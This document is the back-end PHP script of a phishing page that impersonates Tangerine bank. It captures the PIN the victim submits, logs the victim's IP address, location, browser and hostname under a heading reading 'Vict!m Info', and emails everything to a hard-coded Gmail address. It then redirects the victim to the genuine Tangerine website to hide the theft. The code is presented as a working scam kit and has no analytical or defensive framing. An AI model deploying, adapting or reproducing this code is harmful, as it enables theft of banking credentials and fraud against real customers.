<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Tangerine Info-----------------------\n";
$message .= "PIN            : ".$_POST['formtext1']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Scam page Pro -------------\n";
//change ur email here
$send = "mariobloss777@gmail.com";
$subject = "Result from Tangerine";
$headers = "From: Tangerine<skushtoi@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
@mail($send,$subject,$message,$headers);
@mail($to,$subject,$message,$headers);

 }
    header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiooruzg4bRAhUHtxoKHTtNDjkQFggcMAA&url=https%3A%2F%2Fwww.tangerine.ca%2F&usg=AFQjCNFUhrHGxidbICmrmmmK8HkziqtwHA&sig2=28SDUFUA766HKOIcWdwm7w");
  

?>
